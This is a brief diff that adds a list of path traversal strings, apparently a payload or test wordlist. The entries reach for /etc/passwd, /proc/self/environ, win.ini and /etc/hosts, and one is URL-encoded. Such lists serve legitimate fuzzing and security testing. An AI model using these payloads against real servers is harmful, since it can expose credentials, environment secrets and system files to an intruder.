@@ -1,0 +1,6 @@
+../../../../etc/passwd
+../../../proc/self/environ
+../windows/win.ini
+../../../../../../etc/hosts
+..%2F..%2F..%2Fetc%2Fpasswd
+
